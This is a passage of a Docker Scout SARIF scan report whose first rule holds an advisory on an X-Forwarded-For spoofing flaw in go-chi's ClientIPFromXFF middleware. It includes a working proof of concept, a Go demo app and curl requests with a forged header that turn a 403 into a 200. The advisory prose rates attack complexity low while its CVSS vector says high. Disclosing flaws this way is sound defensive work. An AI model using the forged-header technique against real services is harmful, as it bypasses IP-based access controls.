{
  "version": "2.1.0",
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
  "runs": [
    {
      "tool": {
        "driver": {
          "fullName": "Docker Scout",
          "informationUri": "https://docker.com/products/docker-scout",
          "name": "docker scout",
          "rules": [
            {
              "id": "CVE-2026-114437",
              "name": "OsPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2026-114437: Insufficient Verification of Data Authenticity"
              },
              "helpUri": "https://scout.docker.com/v/CVE-2026-114437?s=github&n=v5&ns=github.com%2Fgo-chi%2Fchi&t=golang&vr=%3C%3D5.3.2",
              "help": {
                "text": "### Summary\n\n`ClientIPFromXFF` skips any `X-Forwarded-For` entry in a configured trusted CIDR but never verifies that the direct TCP peer in `http.Request.RemoteAddr` belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by `middleware.GetClientIP`.\n\nThe attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).\n\n**Preconditions:** The application uses `ClientIPFromXFF` and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.\n\n1. Send `GET /admin` directly to the origin with no `X-Forwarded-For` header.\n2. Observe a `403 Forbidden` response and an empty derived client IP.\n3. Repeat the request with `X-Forwarded-For: 10.0.0.7, 198.51.100.42`.\n4. Observe `200 OK` and `client-ip=\"10.0.0.7\"`. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.\n\n### Details\n\nThe vulnerable code is `ClientIPFromXFF` in `middleware/client_ip.go`, lines 93-116 at the tested revision. It calls `walkXFF` with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:\n\n```go\nwalkXFF(r.Header[xForwardedForHeader], func(v string) bool {\n\tip, ok := parseHeaderAddr(v)\n\tif !ok {\n\t\treturn true\n\t}\n\tif inAnyPrefix(ip, prefixes) {\n\t\treturn false\n\t}\n\tfound = ip\n\treturn true\n})\n```\n\nThe function does not parse `r.RemoteAddr` before this walk. Consequently, the configured CIDRs identify trusted strings inside `X-Forwarded-For`, but do not establish that the immediate sender is one of those trusted proxies.\n\n### Proof of concept\n\nUsing Go 1.24 or later, create and run this minimal application against the tested revision:\n\n```sh\nmkdir chi-clientip-poc\ncd chi-clientip-poc\ngo mod init clientip-poc\ngo get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1\ncat > main.go <<'EOF'\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n)\n\nconst allowedIP = \"10.0.0.7\"\n\nfunc main() {\n\tr := chi.NewRouter()\n\tr.Use(middleware.ClientIPFromXFF(\"198.51.100.0/24\"))\n\tr.Get(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n\t\tclientIP := middleware.GetClientIP(r.Context())\n\t\tif clientIP != allowedIP {\n\t\t\thttp.Error(w, fmt.Sprintf(\"denied: tcp-peer=%q client-ip=%q\", r.RemoteAddr, clientIP), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t\tfmt.Fprintf(w, \"allowed: tcp-peer=%q client-ip=%q\\n\", r.RemoteAddr, clientIP)\n\t})\n\n\tlog.Print(\"listening on http://127.0.0.1:3001\")\n\tlog.Fatal(http.ListenAndServe(\"127.0.0.1:3001\", r))\n}\nEOF\ngo run .\n```\n\nThe no-header control was rejected:\n\n```console\n$ curl --http1.1 -i http://127.0.0.1:3001/admin\nHTTP/1.1 403 Forbidden\nContent-Type: text/plain; charset=utf-8\nX-Content-Type-Options: nosniff\nDate: Tue, 06 Oct 2026 15:46:27 GMT\nContent-Length: 48\n\ndenied: tcp-peer=\"127.0.0.1:54416\" client-ip=\"\"\n```\n\nAdding the forged chain authorized the same direct client:\n\n```console\n$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin\nHTTP/1.1 200 OK\nDate: Tue, 06 Oct 2026 15:46:33 GMT\nContent-Length: 57\nContent-Type: text/plain; charset=utf-8\n\nallowed: tcp-peer=\"127.0.0.1:54417\" client-ip=\"10.0.0.7\"\n```\n\n### Impact\n\nI made an anonymous direct connection from `127.0.0.1`, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted `10.0.0.7`. This changed the authorization decision from `403 Forbidden` to `200 OK` for the protected handler.\n",
                "markdown": "> ### Summary\n\n`ClientIPFromXFF` skips any `X-Forwarded-For` entry in a configured trusted CIDR but never verifies that the direct TCP peer in `http.Request.RemoteAddr` belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by `middleware.GetClientIP`.\n\nThe attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).\n\n**Preconditions:** The application uses `ClientIPFromXFF` and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.\n\n1. Send `GET /admin` directly to the origin with no `X-Forwarded-For` header.\n2. Observe a `403 Forbidden` response and an empty derived client IP.\n3. Repeat the request with `X-Forwarded-For: 10.0.0.7, 198.51.100.42`.\n4. Observe `200 OK` and `client-ip=\"10.0.0.7\"`. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.\n\n### Details\n\nThe vulnerable code is `ClientIPFromXFF` in `middleware/client_ip.go`, lines 93-116 at the tested revision. It calls `walkXFF` with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:\n\n```go\nwalkXFF(r.Header[xForwardedForHeader], func(v string) bool {\n\tip, ok := parseHeaderAddr(v)\n\tif !ok {\n\t\treturn true\n\t}\n\tif inAnyPrefix(ip, prefixes) {\n\t\treturn false\n\t}\n\tfound = ip\n\treturn true\n})\n```\n\nThe function does not parse `r.RemoteAddr` before this walk. Consequently, the configured CIDRs identify trusted strings inside `X-Forwarded-For`, but do not establish that the immediate sender is one of those trusted proxies.\n\n### Proof of concept\n\nUsing Go 1.24 or later, create and run this minimal application against the tested revision:\n\n```sh\nmkdir chi-clientip-poc\ncd chi-clientip-poc\ngo mod init clientip-poc\ngo get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1\ncat > main.go <<'EOF'\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n)\n\nconst allowedIP = \"10.0.0.7\"\n\nfunc main() {\n\tr := chi.NewRouter()\n\tr.Use(middleware.ClientIPFromXFF(\"198.51.100.0/24\"))\n\tr.Get(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n\t\tclientIP := middleware.GetClientIP(r.Context())\n\t\tif clientIP != allowedIP {\n\t\t\thttp.Error(w, fmt.Sprintf(\"denied: tcp-peer=%q client-ip=%q\", r.RemoteAddr, clientIP), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t\tfmt.Fprintf(w, \"allowed: tcp-peer=%q client-ip=%q\\n\", r.RemoteAddr, clientIP)\n\t})\n\n\tlog.Print(\"listening on http://127.0.0.1:3001\")\n\tlog.Fatal(http.ListenAndServe(\"127.0.0.1:3001\", r))\n}\nEOF\ngo run .\n```\n\nThe no-header control was rejected:\n\n```console\n$ curl --http1.1 -i http://127.0.0.1:3001/admin\nHTTP/1.1 403 Forbidden\nContent-Type: text/plain; charset=utf-8\nX-Content-Type-Options: nosniff\nDate: Tue, 06 Oct 2026 15:46:27 GMT\nContent-Length: 48\n\ndenied: tcp-peer=\"127.0.0.1:54416\" client-ip=\"\"\n```\n\nAdding the forged chain authorized the same direct client:\n\n```console\n$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin\nHTTP/1.1 200 OK\nDate: Tue, 06 Oct 2026 15:46:33 GMT\nContent-Length: 57\nContent-Type: text/plain; charset=utf-8\n\nallowed: tcp-peer=\"127.0.0.1:54417\" client-ip=\"10.0.0.7\"\n```\n\n### Impact\n\nI made an anonymous direct connection from `127.0.0.1`, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted `10.0.0.7`. This changed the authorization decision from `403 Forbidden` to `200 OK` for the protected handler.\n\n|                                                                                                                          |\n|Package                                                                        pkg:golang/github.com/go-chi/chi/v5@5.3.2  |\n|Affected range                                                                 <=5.3.2                                    |\n|Fixed version                                                                  5.4.0                                      |\n|[[CVSS Score 4.8] [CVSS Vector CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N]]                                             |\n"
              },
